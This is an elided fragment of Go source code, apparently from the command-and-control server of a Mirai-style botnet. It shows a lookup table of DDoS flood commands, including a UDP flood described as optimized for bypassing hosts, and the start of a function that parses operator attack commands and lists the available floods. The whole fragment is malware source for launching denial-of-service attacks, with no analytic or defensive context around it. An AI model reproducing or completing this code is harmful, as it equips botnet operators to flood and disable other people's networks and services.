...
var attackInfoLookup map[string]AttackInfo = map[string]AttackInfo {
    ...
    "!udpbypass": AttackInfo {
        11,
        []uint8 {6, 7},
        "UDP flood with less options. optimized for bypassing hosts",
    },
    "!std": AttackInfo {
        12,
        []uint8 {0, 1, 6, 7},
...
func NewAttack(str string, admin int) (*Attack, error) {
    ...
    if len(args) == 0 {
        ...
        if args[0] == "?" || args[0] == "help" {
            validCmdList := "\033[91mAvailable attack list\r\n\033[0m"
            for cmdName, atkInfo := range attackInfoLookup {
                validCmdList += "\x1b[38;5;202m" + cmdName + "\x1b[0m: \x1b[38;5;202m" + atkInfo.attackDescription + "\r\n\x1b[0m"
            }
